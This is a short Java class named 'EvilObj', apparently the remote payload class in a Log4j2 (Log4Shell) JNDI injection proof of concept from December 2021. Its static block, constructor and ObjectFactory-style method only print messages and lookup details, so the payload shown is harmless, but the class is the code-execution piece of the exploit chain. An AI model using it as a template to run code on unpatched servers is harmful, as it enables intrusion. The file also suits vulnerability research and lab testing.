package Log4J2;

import javax.naming.Context;
import javax.naming.Name;
import java.util.HashMap;

/**
 * @author: 乌鸦坐飞机亠
 * @date: 2021/12/10 21:55
 * @Description:
 */
public class EvilObj {
    static {
        System.out.println("OHHHHHH!!!");
    }

    public Object getObjectInstance(Object obj, Name name, Context context, HashMap<?, ?> environment) throws Exception{
        System.out.println(obj);
        System.out.println(name);
        System.out.println(context);
        System.out.println(environment);
        return null;
    }

    public EvilObj(){
        System.out.println("new Evil");
    }

}
